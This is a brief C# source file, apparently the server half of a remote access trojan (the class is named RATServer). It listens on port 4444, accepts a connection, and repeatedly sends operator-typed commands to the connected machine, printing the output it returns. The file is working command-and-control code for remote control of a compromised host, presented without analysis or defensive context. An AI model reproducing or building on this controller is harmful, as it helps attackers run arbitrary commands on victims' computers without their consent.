using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
namespace TestRatCmd1
{
    class RATServer
    {
        public static void InitServer()
        {
            Console.Clear();
            TcpListener server = new TcpListener(IPAddress.Any, 4444);
            server.Start();
            Console.WriteLine("Serveur en attente de connexion...");

            TcpClient client = server.AcceptTcpClient();
            Console.WriteLine("Client connecté !");
            NetworkStream stream = client.GetStream();

            while (true)
            {
                Console.Write("Commande à exécuter : ");
                string command = Console.ReadLine();
                byte[] data = Encoding.UTF8.GetBytes(command);
                stream.Write(data, 0, data.Length);

                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                Console.WriteLine($"Résultat :\n{response}");
            }
        }
    }
}